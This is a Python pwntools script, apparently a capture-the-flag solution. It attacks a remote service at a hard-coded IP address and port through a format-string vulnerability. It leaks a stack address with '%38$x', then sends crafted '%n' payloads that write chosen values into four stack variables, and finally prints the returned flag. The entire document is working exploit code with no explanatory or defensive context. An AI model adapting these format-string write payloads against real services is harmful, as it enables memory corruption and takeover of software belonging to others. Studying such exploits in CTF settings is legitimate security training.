from pwn import *
import struct
import time

def p(x):
        return struct.pack("<I", x)

def leak_stack():
    r.sendline('%38$x')
    time.sleep(0.3)
    r.recvuntil('answer')
    r.recvline()
    x = r.recvline()
    x = int(x, 16)
    print("0x{:x}".format(x))
    return x

r = remote('159.203.38.169', 5685)

var_224 = -0xd8
var_14 = 0x138
var_18 = 0x134
var_1c = 0x130

x = leak_stack()

# Write 0xffff to var_1c
r.sendline(p(x + var_1c) + '%65531c%6$n')
time.sleep(0.3)

# Write 0x4 to var_224 to proceed
r.sendline(p(x + var_224) + '%6$n')
time.sleep(0.3)

# Write 0x79c to var_14
r.sendline(p(x + var_14) + '%1944c%6$n')
time.sleep(0.3)

# Write 0x7e1 to var_18
r.sendline(p(x + var_18) + '%2013c%6$n')
time.sleep(0.3)

data = r.recvuntil('}')
print(data[data.find('FLAG'):])
